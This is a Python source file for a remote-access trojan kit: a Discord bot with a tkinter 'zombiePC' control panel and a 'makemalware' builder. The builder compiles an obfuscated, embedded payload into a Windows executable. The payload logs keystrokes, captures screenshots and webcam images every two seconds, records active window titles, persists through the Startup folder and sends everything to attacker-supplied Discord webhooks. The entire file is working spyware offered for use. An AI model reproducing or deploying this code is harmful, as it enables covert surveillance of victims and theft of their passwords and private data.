from discord.ext import commands
import tkinter as tk
import threading
from urllib.request import Request,urlopen
from PIL import Image,ImageTk
import io
from tkinter import messagebox
import os
global msg,dic
msg = None
dic = {}
""

def tkinter():
    global msg,dic
    window = tk.Tk()
    window.title("R_handler")
    def loop():
        global dic
        if not list(listbox_1.get(0,tk.END)) == list(dic.keys()):
            listbox_1.insert(listbox_1.size(),list(dic.keys())[len(list(dic.keys()))-1])
        window.after(500,loop)
    def newtab(select):
        global dic
        new = tk.Toplevel(window)
        new.title(list(dic.keys())[select])
        new.geometry("1380x950+300+150")
        new.config(bg="black")
        scroll = tk.Scrollbar(new,background="green")
        scroll2 = tk.Scrollbar(new,background="green")
        scroll.place(x=1353,y=34,height=420)
        scroll2.place(x=1353,y=490,height=420)
        boder_color = tk.Frame(new,background="green")
        boder_color2 = tk.Frame(new, background="green")
        boder_color3 = tk.Frame(new, background="green")
        boder_color4 = tk.Frame(new, background="green")
        boder_color5 = tk.Frame(new, background="green")
        entty1 = tk.Text(new,wrap="word",yscrollcommand=scroll.set,bg="black",fg="green",bd=0)
        entty2 = tk.Text(new, wrap="word", yscrollcommand=scroll2.set,bg="black",fg="green",bd=0)
        entty3 = tk.Text(new,bg="black",fg="green",bd=0)
        label1 = tk.Label(new,image=dic[list(dic.keys())[select]]['img1'],bd=0)
        label2 = tk.Label(new,image=dic[list(dic.keys())[select]]['img2'],bd=0)
        label3 = tk.Label(new,text="cam",font=16,bg="black",fg="green")
        label4= tk.Label(new,text="screen",font=16,bg="black",fg="green")
        label5 = tk.Label(new, text="log", font=16,bg="black",fg="green")
        label6 = tk.Label(new, text="keylogger", font=16,bg="black",fg="green")
        label7 = tk.Label(new, text="nowtab", font=16,bg="black",fg="green")
        ts=""
        ts2=""
        for i in dic[list(dic.keys())[select]]['log']:
            ts = ts + f"{i}\n"
        for i in dic[list(dic.keys())[select]]['text']:
            ts2 = ts2 + f"{i}\n"
        entty1.insert(1.0, ts)
        entty2.insert(1.0, ts2)
        def loop():
            str1 = ""
            str2 = ""
            wrong = None
            wrong2 = None
            for i in dic[list(dic.keys())[select]]['log']:
                str1 = str1 + i
            for i in dic[list(dic.keys())[select]]['text']:
                str2 = str2 + i
            for i,z in zip(str1.replace("\n","").split("@"),range(0,len(str1.replace("\n","").split("@")))):
                check = False
                for x in entty1.get(1.0,"end").replace("\n","").split("@"):
                    if i == x:
                        check = True
                if not check:
                   wrong = z
            if wrong != None:
                Tm = ""
                for i in str1.replace("\n","").split("@")[wrong:]:
                    Tm = Tm + f"@{i}\n"
                entty1.insert("end",Tm)
            for i,z in zip(str2.replace("\n","").split("@"),range(0,len(str2.replace("\n","").split("@")))):
                check = False
                for x in entty2.get(1.0,"end").replace("\n","").split("@"):
                    if i == x:
                        check = True
                if not check:
                   wrong2 = z
            if wrong2 != None:
                Tm = ""
                for i in str2.replace("\n","").split("@")[wrong2:]:
                    Tm = Tm + f"@{i}\n"
                entty2.insert("end",Tm)
            label1.config(image=dic[list(dic.keys())[select]]['img1'])
            label2.config(image=dic[list(dic.keys())[select]]['img2'])
            entty3.delete(1.0,"end")
            entty3.insert(1.0,dic[list(dic.keys())[select]]['nowtab'])
            new.after(500,loop)
        entty1.place(x=750,y=34,width=600,height=420)
        entty2.place(x=750,y=490,width=600,height=420)
        entty3.place(x=750,y=925,width=600,height=20)
        label1.place(x=10, y=34)
        label2.place(x=10, y=490)
        label3.place(x=325, y=0)
        label4.place(x=325, y=456)
        label5.place(x=1030, y=0)
        label6.place(x=1030, y=456)
        label7.place(x=650, y=920)
        boder_color.place(x=8, y=32, width=1920 // 4 + 250+4, height=1080 // 4 + 150+4)
        boder_color2.place(x=8, y=488, width=1920 // 4 + 250+4, height=1080 // 4 + 150+4)
        boder_color3.place(x=748,y=32,width=600+4,height=420+4)
        boder_color4.place(x=748,y=488,width=600+4,height=420+4)
        boder_color5.place(x=748,y=923,width=600+4,height=20+4)
        new.after(500,loop)
    def event():
        threading.Thread(target=newtab, args=(listbox_1.curselection()[0],)).start()
    def makemalware():
        app = tk.Toplevel(window)

        def make_malware():
            malware = """from discord_webhook import DiscordWebhook ,DiscordEmbed #line:1
from pynput .keyboard import Listener #line:2
import threading #line:3
import win32gui #line:4
import getpass #line:5
import time #line:6
import os #line:7
import shutil #line:8
from pathlib import Path #line:9
import socket #line:10
import cv2 #line:11
import pyautogui #line:12
global keylog ,lim ,tab ,crpass ,filenameforexe ,version ,path ,screenshot_delay ,camshot_delay #line:14
keylog =""#line:15
filenameforexe ="파일이름.exe"#line:16
lim =1970 #line:17
LURL ="웹훅링크1"#line:18
LURL2 ="웹훅링크2"#line:19
LURL3 ="웹훅링크3"#line:20
LNAME =getpass .getuser ()#line:21
tab =""#line:22
path ="파일저장경로"#line:23
screenshot_delay =2 #line:24
camshot_delay =2 #line:25
def send (O0OO0OOOOOOO0O0O0 ,O0OO000OOO000OO00 )->None :#line:28
    OOO00OO0O00000000 =DiscordWebhook (url =O0OO000OOO000OO00 ,content =O0OO0OOOOOOO0O0O0 ,username =socket .gethostbyname (socket .gethostname ())+" "+LNAME )#line:29
    OOO00OO0O00000000 .execute ()#line:30
def send_image_to_discord1 (O0OO0O000O0O0OO0O ,OO0OO000OO0OOOOO0 ):#line:33
    try :#line:34
        OOO0000O000O0OO00 =DiscordWebhook (url =OO0OO000OO0OOOOO0 ,content ="@IMAGE1 |",username =socket .gethostbyname (socket .gethostname ())+" "+LNAME )#line:35
        O00OOOO0OOOOO00OO =time .localtime ()#line:36
        with open (f"{O0OO0O000O0O0OO0O}","rb")as OOO00OO0O0000O0O0 :#line:37
            OOO0000O000O0OO00 .add_file (file =OOO00OO0O0000O0O0 .read (),filename =O0OO0O000O0O0OO0O )#line:38
        OOO0000O000O0OO00 .execute ()#line:39
    except :#line:40
        logging ("@ERROR | sending screenshot is Fail")#line:41
def send_image_to_discord2 (O0OOOO0O00OOO000O ,OOOO0O0O0OO0O000O ):#line:42
    try :#line:43
        O0OO0O0OOO000O0OO =DiscordWebhook (url =OOOO0O0O0OO0O000O ,content ="@IMAGE2 |",username =socket .gethostbyname (socket .gethostname ())+" "+LNAME )#line:44
        OO0OO0O00OO0O0000 =time .localtime ()#line:45
        with open (f"{O0OOOO0O00OOO000O}","rb")as O0OO0OOOOOO0000OO :#line:46
            O0OO0O0OOO000O0OO .add_file (file =O0OO0OOOOOO0000OO .read (),filename =O0OOOO0O00OOO000O )#line:47
        O0OO0O0OOO000O0OO .execute ()#line:48
    except :#line:49
        logging ("@ERROR | sending screenshot is Fail")#line:50
def logging (OOO0O0OOOOOO0OO00 ):#line:53
    OOO000OO000O0O0O0 =time .localtime ()#line:54
    OOO0O0OOOOOO0OO00 =f"{OOO0O0OOOOOO0OO00} | {OOO000OO000O0O0O0.tm_year}/{OOO000OO000O0O0O0.tm_mon}/{OOO000OO000O0O0O0.tm_mday} {OOO000OO000O0O0O0.tm_hour}:{OOO000OO000O0O0O0.tm_min}:{OOO000OO000O0O0O0.tm_sec}"#line:55
    send (OOO0O0OOOOOO0OO00 ,LURL3 )#line:56
def on_press (O000OOOO000000OO0 ):#line:58
    global keylog ,lim #line:59
    try :#line:60
        if len (keylog )<lim :#line:61
            keylog =keylog +"."+str (O000OOOO000000OO0 ).replace ("'","")#line:62
        elif len (keylog )>=lim :#line:63
            send ("@KEYLOG | "+keylog ,LURL )#line:64
            logging ("@SUCCESS | KeyLogging is send")#line:65
            keylog =""#line:66
    except :#line:67
        logging ("@ERROR | KeyLogging is Fail")#line:68
def listener_c ():#line:71
    with Listener (on_press =on_press )as O0OOO0O0O000OO0O0 :#line:72
        O0OOO0O0O000OO0O0 .join ()#line:73
def startup ():#line:76
    global filenameforexe ,path #line:77
    OOO0OO00O00000OOO =""#line:78
    for O0OOO00OOOOO000OO in __file__ .split ("\\")[:len (__file__ .split ("\\"))-2 ]:#line:79
        OOO0OO00O00000OOO =f"{OOO0OO00O00000OOO}{O0OOO00OOOOO000OO}\\"#line:80
    OOO0OO00O00000OOO =OOO0OO00O00000OOO +__file__ .split ("\\")[len (__file__ .split ("\\"))-2 ]#line:81
    O00O000O0OOO00OOO =f"C:\\Users\\{LNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\Startup"#line:82
    O000OOOO000OO0O00 =str (Path .cwd ())+"\\"+filenameforexe #line:83
    if not os .path .isdir (path ):#line:84
        os .mkdir (path )#line:85
        logging (f"@SUCCESS | {OOO0OO00O00000OOO}\{path} is maked")#line:86
    if os .path .isdir (O00O000O0OOO00OOO ):#line:87
        try :#line:88
            shutil .copy (O000OOOO000OO0O00 ,O00O000O0OOO00OOO )#line:89
            logging (f"@SUCCESS | copy_move {O000OOOO000OO0O00} -> {O00O000O0OOO00OOO}"+"\\")#line:90
        except :#line:91
            logging (f"@ERROR | copy_move {O000OOOO000OO0O00} -> {O00O000O0OOO00OOO} is fail")#line:92
    else :#line:93
        logging (f"@ERROR | copy_move {O000OOOO000OO0O00} -> {O00O000O0OOO00OOO} is fail cause dir isn't there")#line:94
def Tab ():#line:97
    global tab #line:98
    try :#line:99
        if tab !=win32gui .GetWindowText (win32gui .GetForegroundWindow ()):#line:100
            tab =win32gui .GetWindowText (win32gui .GetForegroundWindow ())#line:101
            send ("@TABLOG "+tab ,LURL2 )#line:102
    except :#line:103
        logging ("@ERROR | TabLogging is Fail")#line:104
def whiling ():#line:106
    while True :#line:107
        Tab ()#line:108
        time .sleep (0.01 )#line:109
def screenshot ():#line:112
    global path #line:113
    try :#line:114
        pyautogui .screenshot (f"{path}\screenshot.jpg")#line:115
        send_image_to_discord2 (f"{path}\screenshot.jpg",LURL3 )#line:116
        os .remove (f"{path}\screenshot.jpg")#line:117
    except :#line:118
        logging ("@ERROR | Get ScreenShot is Fail")#line:119
def camshoot ():#line:122
    global path #line:123
    try :#line:124
        try :#line:125
            OOOO00O0O0OO0O00O =cv2 .VideoCapture (0 )#line:126
        except :#line:127
            logging ("@ERROR | This Computer hasn't cam")#line:128
        OOOO00O0O0OO0O00O .set (3 ,640 )#line:129
        OOOO00O0O0OO0O00O .set (4 ,480 )#line:130
        O0000O00000OOO0OO ,OO00OO00O0OOOOOOO =OOOO00O0O0OO0O00O .read ()#line:131
        OO00OO00O0OOOOOOO =cv2 .flip (OO00OO00O0OOOOOOO ,1 )#line:132
        cv2 .imwrite (f"{path}\camshoot.jpg",OO00OO00O0OOOOOOO )#line:133
        OOOO00O0O0OO0O00O .release ()#line:134
        cv2 .destroyAllWindows ()#line:135
        send_image_to_discord1 (f"{path}\camshoot.jpg",LURL3 )#line:136
        os .remove (f"{path}\camshoot.jpg")#line:137
    except :#line:138
        logging ("@ERROR | CamShoot is Fail")#line:139
def listener_screenshot ():#line:142
    global screenshot_delay #line:143
    while True :#line:144
        screenshot ()#line:145
        time .sleep (screenshot_delay )#line:146
def listener_camshot ():#line:149
    global camshot_delay #line:150
    while True :#line:151
        camshoot ()#line:152
        time .sleep (camshot_delay )#line:153
def Get_IP ():#line:156
    logging (f"@Grabbing | {socket.gethostbyname(socket.gethostname())}")#line:157
def main ():#line:159
    startup ()#line:160
    Get_IP ()#line:161
    threading .Thread (target =listener_c ).start ()#line:162
    threading .Thread (target =whiling ).start ()#line:163
    threading .Thread (target =listener_screenshot ).start ()#line:164
    threading .Thread (target =listener_camshot ).start ()#line:165
if __name__ =='__main__':#line:167
    main ()"""
            malware = malware.replace("웹훅링크1", app_text.get(1.0, "end").replace("\n", "")).replace("웹훅링크2",
                                                                                                   app_text2.get(1.0,
                                                                                                                 "end").replace(
                                                                                                       "\n",
                                                                                                       "")).replace(
                "웹훅링크3", app_text3.get(1.0, "end").replace("\n", "")).replace("파일저장경로",
                                                                              app_path.get(1.0, "end").replace("\n",
                                                                                                               "")).replace(
                "파일이름", app_name.get(1.0, "end").replace("\n", "")).replace("\\","\\\\")
            try:
                with open(app_name.get(1.0,"end").replace("\n","") + ".py","w", encoding="UTF-8") as f:
                    f.write(malware)
                if app_icon.get(1.0,"end").replace("\n","") == "":
                    os.system("pyinstaller -F -w " + app_name.get(1.0,'end').replace('\n','') + ".py")
                else:
                    os.system("pyinstaller -F -w --ico=" + app_icon.get(1.0,"end").replace("\n","") + " " + app_name.get(1.0, 'end').replace('\n', '') + ".py")
                messagebox.showinfo("Make Malware", "success!")
                app.destroy()
            except:
                messagebox.showinfo("Make Malware", "Fail!")
        app_label = tk.Label(app,text="WEBHOOKLINK")
        app_text = tk.Text(app,height=1)
        app_label2 = tk.Label(app,text="WEBHOOKLINK2")
        app_text2 = tk.Text(app,height=1)
        app_label3 = tk.Label(app,text="WEBHOOKLINK3")
        app_text3 = tk.Text(app,height=1)
        app_label4 = tk.Label(app,text="PATH")
        app_path = tk.Text(app,height=1)
        app_label5 = tk.Label(app,text="FILE NAME")
        app_name = tk.Text(app,height=1)
        app_label6 = tk.Label(app,text="ICON(if not,empty)")
        app_icon = tk.Text(app,height=1)
        app_button = tk.Button(app,text="Make Malware", command=make_malware)
        app_label.pack()
        app_text.pack()
        app_label2.pack()
        app_text2.pack()
        app_label3.pack()
        app_text3.pack()
        app_label4.pack()
        app_path.pack()
        app_label5.pack()
        app_name.pack()
        app_label6.pack()
        app_icon.pack()
        app_button.pack()
    listbox_1 = tk.Listbox(window, selectmode="extend", height=0)
    button_1 = tk.Button(window,text="show zombiePC control",command=event)
    button_2 = tk.Button(window,text="makemalware",command=makemalware)
    listbox_1.pack()
    button_1.pack()
    button_2.pack()
    window.after(500,loop)
    window.mainloop()
bot_token = input("bot token : ")
threading.Thread(target=tkinter).start()
bot = commands.Bot(command_prefix="")

@bot.event
async def on_message(message):
    global msg,dic
    msg = message
    check = False
    for k in dic.keys():
        if k == message.author.name:
            check = True
    if not check:
        im = Image.open("R_hander_Data/OIP.jpeg")
        im = im.resize((1920 // 4 + 250, 1080 // 4 + 150), Image.ANTIALIAS)
        image = ImageTk.PhotoImage(im)
        dic[message.author.name] = {"img1" : image, "img2" : image, "text" : [], "log" : [], "nowtab" : ""}
    if message.attachments == []:
        pass
    else:
        if "@IMAGE1" in message.content:
            cover = Request(
                message.attachments[0],
                headers={'User-Agent': 'Mozilla/5.0'})
            data = urlopen(cover, timeout=10).read()
            im = Image.open(io.BytesIO(data))
            width, height = im.size
            im = im.resize((1920//4 + 250, 1080//4 + 150), Image.ANTIALIAS)
            image = ImageTk.PhotoImage(im)
            dic[message.author.name]["img1"] = image
        if "@IMAGE2" in message.content:
            cover = Request(
                message.attachments[0],
                headers={'User-Agent': 'Mozilla/5.0'})
            data = urlopen(cover, timeout=10).read()
            im = Image.open(io.BytesIO(data))
            im = im.resize((1920 // 4 + 250, 1080 // 4 + 150), Image.ANTIALIAS)
            image = ImageTk.PhotoImage(im)
            dic[message.author.name]["img2"] = image
    if "@SUCCESS" in message.content:
        dic[message.author.name]["log"].append(message.content)
    if "@KEYLOG" in message.content:
        dic[message.author.name]["text"].append(message.content)
    if "@ERROR" in message.content:
        dic[message.author.name]["log"].append(message.content)
    if "@TABLOG" in message.content:
        dic[message.author.name]["nowtab"] = message.content
bot.run(bot_token)